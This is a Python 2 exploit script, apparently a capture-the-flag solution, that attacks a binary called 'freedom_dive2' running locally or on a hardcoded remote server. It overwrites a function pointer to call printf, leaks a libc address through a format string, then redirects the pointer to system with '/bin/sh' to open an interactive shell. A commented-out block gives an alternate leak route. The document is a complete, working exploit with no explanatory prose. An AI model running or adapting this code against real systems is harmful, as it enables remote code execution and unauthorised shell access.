import pwnbox,struct
SERVER = True
d = lambda x : struct.unpack("<I",x)[0]
s = lambda x : struct.pack("<I",x)
if not SERVER:
  p = pwnbox.pipe.ProcessPipe("./freedom_dive2_9216C167C1AD8440CAE10622979A2F87E40A32BA")
else:
  p = pwnbox.pipe.SocketPipe("45.32.38.83",28882)
def menu(): p.read_until("menu :")
def input_name(n):
  p.read_until("\n")
  p.write(n+"\n")
def set_profile(name,des):
  menu()
  p.write("1\n")
  p.read_until(":")
  p.write(name+"\n")
  p.read_until(":")
  p.write(des+"\n")

def echo(data,get=False):
  menu()
  p.write("0\n")
  p.read_until(":")
  p.write(data+"\n")
  p.read_until("Echo : ")
  if get :return p.read_byte(0x100)


def delete():
  menu()
  p.write("4\n")
input_name("daramg")
set_profile("daramg","daramg")
set_profile("daramg","daramg")
set_profile("daramg","daramg")
set_profile("daramg","daramg")
delete()
raw_input()
printf = 0x08048450
payload = ""
payload += "AAAA%8$x"
payload += "A"*(0xfc-len(payload))
payload += s(printf)
echo(payload)
delete()
p.read_until("AAAA")
if SERVER:
  libc = int(p.read_byte(8),16)-0x73287
  system = libc +0x0003b180
else:
  libc = int(p.read_byte(8),16)-0x766b7
  system = libc +0x00040190
print hex(libc)
print hex(system)
payload = ""
payload += "/bin/sh\x00"
payload += "A"*(0xfc-len(payload))
payload += s(system)
echo(payload)
delete()
p.interact()
"""
free= d(echo("A"*(0xfc-1),True)[-4:])
if not SERVER:
  libc = free-0x00076c60
  system = libc +0x00040190
else:
  libc = free-0x000738a0
  system = libc +0x0003b180
print hex(libc)
payload = "/bin/sh\x00"
payload += "A"*(0xfc-len(payload))
payload += s(system)
echo(payload+"\n")
delete()
p.interact()
"""
